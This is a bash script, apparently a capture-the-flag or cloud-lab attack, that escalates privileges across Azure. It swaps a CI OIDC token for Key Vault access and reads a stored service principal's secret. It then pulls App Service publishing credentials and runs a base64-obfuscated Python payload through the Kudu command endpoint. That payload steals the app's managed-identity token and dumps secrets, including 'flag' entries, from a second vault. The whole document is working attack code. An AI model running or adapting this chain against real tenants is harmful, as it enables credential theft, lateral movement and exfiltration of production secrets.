#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'; say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
BASE=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
RPT=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RPT"|jq -r '.value|fromjson|.appId // empty'); RSC=$(echo "$RPT"|jq -r '.value|fromjson|.clientSecret // empty'); RT=$(echo "$RPT"|jq -r '.value|fromjson|.tenantId // empty')
RA=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$RT/oauth2/v2.0/token" -d "client_id=$RID" -d 'grant_type=client_credentials' -d "client_secret=$RSC" -d 'scope=https://management.azure.com/.default' | jq -r '.access_token // empty')
B="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RA" -H 'Content-Length: 0' "$B/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC"|jq -r '.properties.publishingUserName // empty'); PP=$(echo "$PC"|jq -r '.properties.publishingPassword // empty')
say "PUB=$([[ -n "$PU" && -n "$PP" ]] && echo OK || echo FAIL)"; [[ -n "$PU" && -n "$PP" ]] || exit 0
SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
R=$(curl -sS --max-time 20 -u "$PU:$PP" "$SCM/api/vfs/results.json")
IE=$(echo "$R"|jq -r '.IDENTITY_ENDPOINT // empty' 2>/dev/null || true); IH=$(echo "$R"|jq -r '.IDENTITY_HEADER // empty' 2>/dev/null || true)
say "IE_SET=$([[ -n "$IE" ]] && echo yes || echo no) IH_SET=$([[ -n "$IH" ]] && echo yes || echo no)"
if [[ -z "$IE" || -z "$IH" ]]; then say NO_MI_ENV; exit 0; fi
PYSRC=$(cat <<'PYEOF'
import json,urllib.request,base64
ie="__IE__"; ih="__IH__"
u=ie+"?resource=https://vault.azure.net&api-version=2019-08-01"
req=urllib.request.Request(u,headers={"X-IDENTITY-HEADER":ih})
tok=json.loads(urllib.request.urlopen(req,timeout=10).read()).get("access_token","")
print("MI_TOKEN_LEN",len(tok))
for path in ["secrets?api-version=7.4","secrets/flag?api-version=7.4","secrets/FLAG?api-version=7.4"]:
    try:
        q=urllib.request.Request("https://kv-tbl-sec-x3euoz.vault.azure.net/"+path,headers={"Authorization":"Bearer "+tok})
        b=urllib.request.urlopen(q,timeout=10).read()
        print(path,"HTTP200","B64",base64.b64encode(b).decode())
    except Exception as e:
        print(path,"ERR",str(e)[:200])
PYEOF
)
PYSRC=${PYSRC/__IE__/$IE}; PYSRC=${PYSRC/__IH__/$IH}
PYS=$(printf '%s' "$PYSRC" | base64 -w0)
CMD="python3 -c \"import base64;exec(base64.b64decode('$PYS'))\""
BODY=$(jq -nc --arg c "$CMD" '{command:$c,dir:"/home/site/wwwroot"}')
OUT=$(curl -sS --max-time 40 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$BODY")
say "KUDU_OUT_B64=$(printf '%s' "$OUT" | base64 -w0)"
say DONE
